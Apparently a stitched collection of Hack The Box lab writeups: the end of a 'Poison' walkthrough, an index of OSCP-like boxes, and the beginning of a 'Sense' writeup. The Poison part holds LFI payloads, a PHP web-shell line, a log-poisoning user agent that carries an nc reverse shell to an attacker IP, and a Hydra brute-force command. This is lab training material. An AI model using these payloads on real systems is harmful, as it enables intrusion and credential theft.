* Ports 80 is running a web server, so we’ll perform our standard enumeration techniques on it.

## Enumeration <a id="46e8"></a>

I always start off with enumerating HTTP first.

**Port 80**

Visit the application in the browser.

![](https://miro.medium.com/max/1032/1*6vTsCaMX9HFDrTmZbFnvcA.png)

It’s a simple website that takes in a script name and executes it. We’re given a list of scripts to test, so let’s test them one by one. The ini.php & info.php scripts don’t give us anything useful. The phpinfo.php script gives us a wealth of information on the PHP server configuration. The listfiles.php script gives us the following output.

```text
Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

The pwdbackup.txt file looks interesting. Let’s see if we can view it in the application.

![](https://miro.medium.com/max/1017/1*d0IU2Te57a2xHqS257inVA.png)

We get the following output.

```text
This password is secure, it's encoded atleast 13 times.. what could go wrong really..Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
```

Based on the output, we can deduce that the application is not validating user input and therefore is vulnerable to local file inclusion \(LFI\). Based on the comment, this file includes a password that is encoded. Before we go down the route of decoding the password and trying to SSH into an account using it, let’s see if we can turn the LFI into a remote file inclusion \(RFI\).

There are several methods we can try.

**PHP http:// Wrapper**

The PHP http wrapper allows you to access URLs. The syntax of the exploit is:

```text
http://[path-to-remote-file]
```

Start a simple python server.

```text
python -m SimpleHTTPServer 5555
```

Attempt to run a file hosted on the server.

![](https://miro.medium.com/max/1414/1*XRX5FZPgJIMgfw_c-ayQHw.png)

We get an error informing us that the http:// wrapper is disabled. Similarly, we can try ftp:// but that is also disabled.

**PHP expect:// Wrapper**

The PHP expect wrapper allows you to run system commands. The syntax of the exploit is:

```text
expect://[command]
```

This functionality is not enabled by default so let’s check if our application has it enabled. Intercept the request using Burp and attempt to run the ‘id’ command.

![](https://miro.medium.com/max/1416/1*6jejQhxQb7v7xX4PHQ0fQg.png)

We get an error informing us that the PHP expect wrapper is not configured.

**PHP input:// Wrapper**

The input:// wrapper allows you to read raw data from the request body. Therefore, you can use it to send a payload via POST request. The syntax for the request would be:

```text
php://input&cmd=[command]
```

The syntax for post data would be:

```text
<?php echo shell_exec($GET['cmd']); ?>
```

This doesn’t work for our request, but I thought it was worth mentioning. There are several other techniques you can try that are not mentioned in this blog. However, I’m confident that the application is not vulnerable to RFI so I’m going to move on.

One useful technique you should know is how to view the source code of files using the filter:// wrapper.

**PHP filter:// Wrapper**

When a file such as index.php is executed, the page only show the output of the script. To view the source code, you can use the filter:// wrapper.

```text
php://filter/convert.base64-encode/resource=[file-name]
```

This will encode the page in base64 and output the encoded string.

For example, to view the ini.php file, run the below command.

![](https://miro.medium.com/max/1265/1*ENEGB6rnCEqDsHKGCKAoEg.png)

This gives you a base64 encoded version of the source code. Decode the string.

```text
echo "PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K" | base64 --decode
```

You get the source code.

```text
<?php
print_r(ini_get_all());
?>
```

We diverged a little bit from solving this machine, the conclusion of all the above testing is that it is not vulnerable to an RFI. So let’s move on to gaining an initial foothold on the system.

## Initial Foothold <a id="0a99"></a>

Gaining an initial foothold can be done in three ways.

* Decode the pwdbackup.txt file and use the decoded password to SSH into a user’s account.
* Race condition exploit in phpinfo.php file that turns the LFI to an RCE.
* Log poisoning exploit that turns the LFI to an RCE.

I initially got access to the machine using method 1 and then exploited methods 2 & 3 after watching [ippsec’s video](https://www.youtube.com/watch?v=rs4zEwONzzk).

**Method 1: pwdbackup.txt**

The output of the pwdbackup.txt file gives us a hint that the password is encoded at least 13 times, so let’s write a simple bash script to decode it.

```text
#!/bin/bash# secret.txt contains encoded text
secret=$(<secret.txt)for i in {1..13}; do
        secret=$(<<<"$secret" base64 --decode)
done
echo "$secret"
```

Save the script in a file called decode.sh and run it.

```text
root@kali:~/Desktop/htb/poison# ./decode.sh 
Charix!2#4%6&8(0
```

We get back a password. We want to try this password to SSH into a user’s account, however, we don’t have a username. Let’s try and get that using the LFI vulnerability. Enter the following string in the Scriptname field to output the /etc/passwd file.

```text
/etc/passwd
```

We get back the following data \(truncated\).

```text
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
.....
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

Only two users have login shells: root and charix. Considering the password we found, we know it belongs to Charix.

SSH into Charix account using the credentials we found.

```text
ssh charix@10.10.10.84 
```

View the user.txt flag.

![](https://miro.medium.com/max/659/1*6LIz4nn7HtwdJAb79pRtfw.png)

**Method 2: phpinfo.php Race Condition**

In 2011, [this research paper](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) was published outlining a race condition that can turn an LFI vulnerability to a remote code execution \(RCE\) vulnerability. The following server side components are required to satisfy this exploitable condition:

* An LFI vulnerability
* Any script that displays the output of the PHPInfo\(\) configuration

As we saw in the enumeration phase, the Poison htb server satisfies both conditions. Therefore, let’s download the[ script](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py) and modify it to fit our needs.

First, change the payload to include the following reverse shell available on kali by default.

```text
/usr/share/laudanum/php/php-reverse-shell.php
```

Make sure to edit the IP address and port. Next, change the LFIREQ parameter to the one in our application.

```text
LFIREQ="""GET /browse.php?file=%s
```

You’ll also have to change all the “=&gt;” to “=&gt” so that the script compiles properly.

That’s it for modifying the script. Now, set up a listener to receive the shell.

```text
nc -nlvp 1234
```

Run the script.

```text
python phpinfolfi.py 10.10.10.84 80
```

We get a shell!

![](https://miro.medium.com/max/1362/1*s_GIfAvOavOqE_ACMDSlNw.png)

**Method 3: Log Poisoning**

This was probably the intended way of solving the machine considering that the box is called “Poison”. Log Poisoning is a common technique used to gain RCE from an LFI vulnerability. The way it works is that the attacker attempts to inject malicious input to the server log. Then using the LFI vulnerability, the attacker calls the server log thereby executing the injected malicious code.

So the first thing we need to do is find the log file being used on the server. A quick google search tells us that freebsd saves the log file in the following location.

```text
/var/log/httpd-access.log
```

A sample entry in the access log is:

```text
10.10.14.12 - - [05/Jan/2020:06:20:15 +0100] "GET /browse.php?file=php://filter/convert.base64-encode/resource=ini.php HTTP/1.1" 200 44 "http://10.10.10.84/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

Notice that the user agent “_Mozilla/5.0 \(X11; Linux x86\_64; rv:68.0\) Gecko/20100101 Firefox/68.0_” is being logged. Since the user agent is something that is completely in our control, we can simply change it to send a reverse shell back to our machine.

Intercept the request in Burp and change the user agent to the reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```text
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 6666 >/tmp/f') ?>
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 6666
```

Execute the request in Burp so that the PHP code is saved in the log file. Using the LFI vulnerability call the log file which in turn should execute the reverse shell.

```text
http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log
```

We get a shell!

![](https://miro.medium.com/max/760/1*ov6P4njioA4mjDaHBHat2Q.png)

## Privilege Escalation <a id="0811"></a>

Since the machine is running a freeBSD OS, the LinEnum script won’t work on it. So we’ll have to resort to manual means of enumeration.

If you list the files in Charix’s home directory, you’ll find a secret.zip file.

```text
charix@Poison:~ % ls -l
total 8
-rw-r-----  1 root  charix  166 Mar 19  2018 secret.zip
-rw-r-----  1 root  charix   33 Mar 19  2018 user.txt
```

If you try to decompress the file, it will ask for a password. Let’s first transfer the file to our attack machine.

```text
scp charix@10.10.10.84:/home/charix/secret.zip .
```

Try to decompress the file using Charix’s SSH password. Most user’s reuse passwords.

```text
unzip secret.zip
```

It works! Check the file type.

```text
root@kali:~/Desktop/htb/poison# file secret
secret: Non-ISO extended-ASCII text, with no line terminators
```

The file seems to be encoded. Before we go down the route of figuring out what type of encoding is being used, let’s park this for now and do more enumeration.

In the target machine, run the ps command to see which processes are running.

```text
ps -aux
```

There’s a VNC process being run as root.

```text
root    529  0.0  0.7  23620 7432 v0- I    Fri23      0:00.04 Xvnc :1 -desktop X -httpd /usr/local/sha
```

Let’s view the entire process information.

```text
charix@Poison:~ % ps -auxww | grep vnc
root    529   0.0  0.7  23620 7432 v0- I    Fri23      0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

VNC is a remote access software. The -rfbport flag tells us that it’s listening on port 5901 on localhost.

We can verify that using the netstat command.

```text
charix@Poison:~ % netstat -an | grep LIST
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

Since VNC is a graphical user interface software, we can’t access it through our target machine. We need port forwarding.

```text
# ssh -L [local-port]:[remote-ip]:[remote-port]
ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
```

The above command allocates a socket to listen to port 5000 on localhost from my attack machine \(kali\). Whenever a connection is made to port 5000, the connection is forwarded over a secure channel and is made to port 5901 on localhost on the target machine \(poison\).

We can verify that the command worked using netstat.

```text
root@kali:~/Desktop/htb/poison# netstat -an | grep LIST
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN                                                                                                     
tcp6       0      0 ::1:5000                :::*                    LISTEN
```

Now that port forwarding is set, let’s connect to VNC on the attack machine.

```text
root@kali:~/Desktop/htb/poison# vncviewer 127.0.0.1:5000
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password:
```

I tried Charix’s password but that didn’t work. I then googled “vnc password” and found the following description on the man page.

![](https://miro.medium.com/max/401/1*jQwwoJMoBXfU1BhRGjjYCw.png)

When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option. Earlier in this blog we found a secret file that we didn’t know where to use. So let’s see if it’s the obfuscated password file we’re looking for.

```text
vncviewer 127.0.0.1:5000 -passwd secret
```

We’re in!

![](https://miro.medium.com/max/920/1*k_1NH-bUsfMMvByRSWSPjQ.png)

VNC was running with root privileges so we can view the root.txt file.

![](https://miro.medium.com/max/779/1*PI-IzUmDv4Hn17f5CWPhWw.png)

Before we end this blog, let’s check if there is any online tools that decode the obfuscated password file. Since it’s not encrypted, we should be able to reverse it without a password.

After a bit of googling, I found this [github repository](https://github.com/trinitronx/vncpasswd.py) that does that for us. Clone the repository and run the script on our file.

```text
python vncpasswd.py -d -f ../../htb/poison/secret
```

* **-d:** decrypt
* **-f:** file

We get the following output showing us the plaintext password is “VNCP@$$!”.

```text
Cannot read from Windows Registry on a Linux system
Cannot write to Windows Registry on a Linux system
Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'
```

Now that we know the password, we could directly log into VNC using the plaintext password instead of the obfuscated password file.

## Lessons Learned <a id="5a84"></a>

To gain an initial foothold on the box we exploited four vulnerabilities.

1. LFI vulnerability that allowed us to both enumerate files and call and execute malicious code we stored on the server. This could have been easily avoided if the developer validated user input.
2. Sensitive information disclosure. The pwdbackup.txt file that contained a user’s SSH password was publicly stored on the server for anyone to read. Since the content of the file was encoded instead of encrypted, we were able to easily reverse the content and get the plaintext password. This could have been avoided if the password file was not publicly stored on the server and strong encryption algorithms were used to encrypt the file.
3. Log file poisoning. Since the log file was storing the user agent \(user controlled data\) without any input validation, we were able to inject malicious code into the server that we executed using the LFI vulnerability. Again, this could have been easily avoided if the developer validated user input.
4. Security misconfiguration that lead to a race condition in phpinfo.php file. This required two conditions to be present: \(1\) an LFI vulnerability which we already discussed, and \(2\) a script that displays the output of the phpinfo\(\) configuration. The administrators should have disabled the phpinfo\(\) function in all production environments.

To escalate privileges we exploited one vulnerability.

1. Reuse of password. The zip file that contained the VNC password was encrypted using Charix’s SSH password. The question we really should be asking is why is the password that gives you access to the root account encrypted with a lower privileged user’s password? The remediation recommendations for this vulnerability are obvious.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
README.md
# HTB Linux Boxes

List of HTB Linux boxes that are similar to the OSCP labs.

<table>
  <thead>
    <tr>
      <th style="text-align:center"> <a href="lame-writeup-w-o-metasploit.md"><b>Lame</b></a>&lt;b&gt;&lt;/b&gt;</th>
      <th
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="brainfuck-writeup-w-o-metasploit.md"><b>Brainfuck</b></a><b>   </b>
        </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:center">
        <br />&#x200B;
        <img src="https://gblobscdn.gitbook.com/assets%2F-M7FrW_mh9HesegKl0UA%2F-M7FwpSwASfYjrxiqukb%2F-M7FyvpoZtqzkvXiaWQd%2Fimage.png?alt=media&amp;token=631d7880-d429-4cc1-91fe-efafce26ff80"
        alt/>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="https://gblobscdn.gitbook.com/assets%2F-M7FrW_mh9HesegKl0UA%2F-M7FwpSwASfYjrxiqukb%2F-M7Fz2pLdOiY_byefsPp%2Fimage.png?alt=media&amp;token=b943fd36-ef6c-4685-89fd-866a8fd0380c"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="shocker-writeup-w-o-metasploit.md"><b>Shocker</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="https://rana-khalil.gitbook.io/tj-null-s-hack-the-box-oscp-like-vms/linux-boxes/bashed-writeup-w-o-metasploit"><b>Bashed</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/image (3).png" alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/image (5).png" alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="nibbles-writeup-w-o-metasploit.md"><b>Nibbles</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="beep-writeup-w-o-metasploit.md"><b>Beep</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-14-at-12.09.34-am.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/image (7).png" alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="cronos-writeup-w-o-metasploit.md"><b>Cronos</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center"><a href="nineveh-writeup-w-o-metasploit.md"><b>Nineveh</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.11.54-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.12.23-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="sense-writeup-w-o-metasploit.md"><b>Sense</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center"><a href="solidstate-writeup-w-o-metasploit.md"><b>SolidState</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.13.58-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.14.27-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="node-writeup-w-o-metasploit.md"><b>Node</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="valentine-writeup-w-o-metasploit.md"><b>Valentine</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.15.50-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.16.21-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="poison-writeup-w-o-metasploit.md"><b>Poison</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center"><a href="sunday-writeup-w-o-metasploit.md"><b>Sunday</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.18.41-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.19.08-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="tartarsauce-writeup-w-o-metasploit.md"><b>TartarSauce</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="irked-writeup-w-o-metasploit.md"><b>Irked</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.25.33-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.26.03-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="friendzone-writeup-w-o-metasploit.md"><b>FriendZone</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="swagshop-writeup-w-o-metasploit.md"><b>SwagShop</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.27.35-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.28.05-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="networked-writeup-w-o-metasploit.md"><b>Networked</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="jarvis-writeup-w-o-metasploit.md"><b>Jarvis</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.29.20-pm.png"
          alt/>
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="../.gitbook/assets/screen-shot-2020-05-15-at-11.29.48-pm.png"
          alt/>
        </p>
      </td>
    </tr>
    <tr>
      <td style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="magic-writeup-w-o-metasploit.md"><b>Magic</b></a>&lt;b&gt;&lt;/b&gt;</td>
      <td
      style="text-align:center">&lt;b&gt;&lt;/b&gt;<a href="tabby-writeup-w-o-metasploit.md"><b>Tabby</b></a>&lt;b&gt;&lt;/b&gt;</td>
    </tr>
    <tr>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="https://miro.medium.com/max/594/1*j2Q42VFXL2vn_RM5kNrovA.png"
          alt="Image for post" />
        </p>
      </td>
      <td style="text-align:center">
        <p></p>
        <p>
          <img src="https://miro.medium.com/max/591/1*mh2clkXmiJxHT_y7hU2WxQ.png"
          alt="Image for post" />
        </p>
      </td>
    </tr>
  </tbody>
</table>

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
sense-writeup-w-o-metasploit.md
# Sense Writeup w/o Metasploit

![](https://miro.medium.com/max/580/1*ImTgbA-g16F9oCfvrjvMDg.png)

## Reconnaissance <a id="0ef7"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.60
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* Port 80: running lighttpd 1.4.35 over HTTP
* Port 443: running lighttpd 1.4.35 over HTTPS

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 23:29 EST
Nmap scan report for 10.10.10.60
Host is up (0.034s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): OpenBSD 4.X (94%)
OS CPE: cpe:/o:openbsd:openbsd:4.0
Aggressive OS guesses: OpenBSD 4.0 (94%), OpenBSD 4.3 (91%)
No exact OS matches for host (test conditions non-ideal).OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.20 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.60
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.60
```

We get back the following result showing no ports are open.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 23:45 EST
Nmap scan report for 10.10.10.60
Host is up (0.063s latency).
All 65535 scanned ports on 10.10.10.60 are open|filteredNmap done: 1 IP address (1 host up) scanned in 4151.01 seconds
```

Before we move on to enumeration, let’s make a mental note about the nmap scan results.

* Port 80 redirects to port 443 so we really only have one port to enumerate.

## Enumeration <a id="572e"></a>

Let’s start enumerating port 443. Visit the application using the browser.

![](https://miro.medium.com/max/861/1*3PQ-rrGuyauSEoL-GAf0hQ.png)

We get a pfSense login page. pfSense is a free and open-source firewall and router. Since it is an off the shelf software, the first thing I did is google “pfsense default credentials” and found the following page.

![](https://miro.medium.com/max/622/1*pIFf8wDOwNq1HAA5-mh1NQ.png)

I tried admin/pfsense but that did not work. I also tried common credentials such as admin/admin, pfsense/pfsense, admin/password, etc.

When that didn’t work I had a not-so-bright-idea of brute forcing the credentials using Hydra.

```text
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form "/index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect"
```

That ended up getting me blocked. In hindsight it makes sense. It wasn’t very smart to brute force the credentials of a firewall.

Next, I ran gobuster to enumerate directories.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k
```

* **dir:** uses directory/file brute forcing mode.
* **-w:** path to the wordlist.
* **-u:** the target URL or Domain.
* **-k:** skip SSL certificate verification.

I got back the following results.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/29 00:03:57 Starting gobuster
===============================================================
/themes (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/javascript (Status: 301)
/classes (Status: 301)
/widgets (Status: 301)
/tree (Status: 301)
/shortcuts (Status: 301)
/installer (Status: 301)
/wizards (Status: 301)
/csrf (Status: 301)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
===============================================================
2019/12/29 00:30:17 Finished
===============================================================
```

I didn’t get anything useful.

Next, run searchsploit to view if the software is associated with any vulnerabilities.

```text
searchsploit pfsense
```

We get back the following result.

![](https://miro.medium.com/max/1374/1*vom2AvJDOY6T-oju6gvV8A.png)

Nothing really pops out. Most of the exploits require authentication. At this point, I would have given up on this port and started enumerating another port. However, this is the only port we can enumerate for this machine. So we have to find something with gobuster.

Let’s change our gobuster command to include extensions.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x php,txt,conf
```

* **-x:** file extension\(s\) to search for

I added the extensions txt & conf to look for any configuration files or text files left by system administrators.

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,conf
[+] Timeout:        10s
===============================================================
2019/12/29 09:28:51 Starting gobuster
===============================================================
/index.php (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 301)
/system-users.txt (Status: 200)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
```

Two files that immediately catch my eye are changelog.txt & system-users.txt.

![](https://miro.medium.com/max/964/1*jRsyREuNyULhMXjRnLj3Kw.png)

The change-log.txt file tells us that they’re definitely using a vulnerable version of pfSense. However, they did patch two of the three vulnerabilities that are associated with this software. We have to keep that in mind when exploiting the application.

The system-users.txt file gives us credentials!

![](https://miro.medium.com/max/561/1*BQz3D5xII-W4P6XHDmpFZg.png)

The username is **rohit** and the password is the default password **pfsense**. Let’s log into the application.

![](https://miro.medium.com/max/587/1*RUQXFAarmJ1LmoMTxiIdtA.png)

